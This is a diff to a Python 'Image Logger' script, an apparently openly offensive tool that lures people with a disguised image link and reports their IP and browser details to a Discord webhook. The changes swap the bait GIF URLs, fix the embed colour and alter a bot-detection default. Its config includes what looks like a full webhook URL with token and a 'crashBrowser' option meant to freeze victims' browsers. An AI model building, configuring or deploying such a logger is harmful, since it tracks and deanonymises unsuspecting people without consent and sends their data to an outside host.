@@ -1,4 +1,3 @@
-
 from http.server import BaseHTTPRequestHandler
 from urllib import parse
 import traceback, requests, base64, httpagentparser
@@ -11,13 +10,13 @@ __author__ = "Im A Skid"
 config = {
     # BASE CONFIG #
     "webhook": "https://discord.com/api/webhooks/1378721215019221012/YS1t7oTqEFfzM9wg6IYo1aJn_cFDrggkn8yeaxQKsUinuFN8kKL1XuQ65vD9MKVaPaSe",
-    "image": "https://media1.tenor.com/m/9MVlipGuNioAAAAC/you-are-an-idiot.gif", # You can also have a custom image by using a URL argument
+    "image": "https://c.tenor.com/BuXFFJzCD4QAAAAC/tenor.gif", # You can also have a custom image by using a URL argument
                                                # (E.g. yoursite.com/imagelogger?url=<Insert a URL-escaped link to an image here>)
     "imageArgument": True, # Allows you to use a URL argument to change the image (SEE THE README)
 
     # CUSTOMIZATION #
     "username": "Image Logger", # Set this to the name you want the webhook to have
-    "color": #03ff39, # Hex Color you want for the embed (Example: Red is 0xFF0000)
+    "color": 0x00FFFF, # Hex Color you want for the embed (Example: Red is 0xFF0000)
 
     # OPTIONS #
     "crashBrowser": False, # Tries to crash/freeze the user's browser, may not work. (I MADE THIS, SEE https://github.com/dekrypted/Chromebook-Crasher)
@@ -49,7 +48,7 @@ config = {
     # REDIRECTION #
     "redirect": {
         "redirect": True, # Redirect to a webpage?
-        "page": "https://media1.tenor.com/m/9MVlipGuNioAAAAC/you-are-an-idiot.gif" # Link to the webpage to redirect to 
+        "page": "https://media1.tenor.com/m/BuXFFJzCD4QAAAAC/open-this-in-browser.gif" # Link to the webpage to redirect to 
     },
 
     # Please enter all values in correct format. Otherwise, it may break.
@@ -70,7 +69,7 @@ def botCheck(ip, useragent):
     elif useragent.startswith("TelegramBot"):
         return "Telegram"
     else:
-        return True
+        return False
 
 def reportError(error):
     requests.post(config["webhook"], json = {
